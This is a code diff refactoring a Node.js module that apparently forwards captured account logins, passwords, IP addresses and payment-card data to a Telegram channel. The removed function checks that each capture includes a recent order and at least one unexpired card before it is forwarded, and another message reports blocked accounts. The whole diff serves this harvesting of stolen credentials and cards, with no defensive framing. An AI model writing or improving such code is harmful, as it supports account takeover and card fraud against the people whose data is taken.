@@ -16,7 +16,8 @@ const crypto = require('crypto');
 const { createLogger } = require('../shared/logger');
 const { reserveForwarded, releaseForwarded } = require('../telegram/channelForwardStore');
 const { buildCheckAndCaptureResult } = require('../telegram/messages');
-const { codeV2 } = require('../telegram/messages/helpers');
+const { escapeV2, codeV2, boldV2 } = require('../telegram/messages/helpers');
+const { validateCaptureForForwarding } = require('../shared/capture/validateCaptureForForwarding');
 
 const log = createLogger('channel-forwarder');
 
@@ -103,47 +104,6 @@ class ChannelForwarder {
   }
 
   /**
-   * Validate capture data meets forwarding requirements
-   * Requirements: latestOrder !== 'n/a' AND cards.length > 0
-   */
-  validateCaptureData(capture) {
-    if (!capture) {
-      return { valid: false, reason: 'no capture data' };
-    }
-
-    // Check for latest order (not 'n/a')
-    if (!capture.latestOrder || capture.latestOrder === 'n/a') {
-      return { valid: false, reason: 'no latest order' };
-    }
-
-    // Check for card data (profile must exist with cards array)
-    if (!capture.profile) {
-      return { valid: false, reason: 'no profile data' };
-    }
-
-    if (!capture.profile.cards || capture.profile.cards.length === 0) {
-      return { valid: false, reason: 'no cards captured' };
-    }
-
-    // Require at least one unexpired card
-    const hasUnexpiredCard = capture.profile.cards.some((card) => {
-      if (!card || !card.expiry) return false;
-      const [mm, yy] = String(card.expiry).split(/[\/\-]/);
-      const month = Number(mm);
-      const year = yy ? Number(yy.length === 2 ? `20${yy}` : yy) : NaN;
-      if (!month || month < 1 || month > 12 || !year) return false;
-      const expiryDate = new Date(year, month, 0); // last day of month
-      return expiryDate >= new Date();
-    });
-
-    if (!hasUnexpiredCard) {
-      return { valid: false, reason: 'all cards expired or missing expiry' };
-    }
-
-    return { valid: true, reason: '' };
-  }
-
-  /**
    * Handle forward_event from worker
    * Event: {username, password, capture, ipAddress, timestamp}
    * 
@@ -164,7 +124,7 @@ class ChannelForwarder {
     });
 
     // Forward only when capture meets guard criteria.
-    const validation = capture ? this.validateCaptureData(capture) : { valid: false, reason: 'no capture data' };
+    const validation = capture ? validateCaptureForForwarding(capture) : { valid: false, reason: 'no capture data' };
     if (!validation.valid) {
       log.debug(`Skipping forward: ${validation.reason}`, {
         username: username.substring(0, 5) + '***'
@@ -420,18 +380,6 @@ class ChannelForwarder {
    * Format BLOCKED status message for channel
    */
   formatBlockedMessage(trackingCode, username) {
-    const escapeV2 = (text) => {
-      return text.replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
-    };
-    
-    const codeV2 = (text) => {
-      return `\`${text.replace(/[`\\]/g, '\\$&')}\``;
-    };
-    
-    const boldV2 = (text) => {
-      return `*${text.replace(/[*\\]/g, '\\$&')}*`;
-    };
-
     const parts = [
       `🔒 ${boldV2('ACCOUNT BLOCKED')}`,
       '',
@@ -465,7 +413,7 @@ class ChannelForwarder {
       log.info('Scanning for pending forwards to retry');
 
       // Scan for all pending forward keys
-      const pendingKeys = await this.redis.executeCommand('keys', 'forward:pending:*');
+      const pendingKeys = await this.redis.scanAsync('forward:pending:*');
       
       if (pendingKeys.length === 0) {
         log.debug('No pending forwards found');
